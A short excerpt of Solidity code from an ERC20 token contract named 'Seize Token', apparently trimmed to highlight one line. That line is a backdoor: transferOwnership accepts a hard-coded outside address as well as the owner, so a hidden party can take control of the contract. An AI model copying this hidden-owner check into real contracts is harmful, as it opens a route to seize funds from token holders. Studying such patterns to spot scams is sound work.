...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x1C0D3dB8d15E6aC442a1159B3693AF3A1aB08627));
...
contract SeizeToken is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "Seize Token";
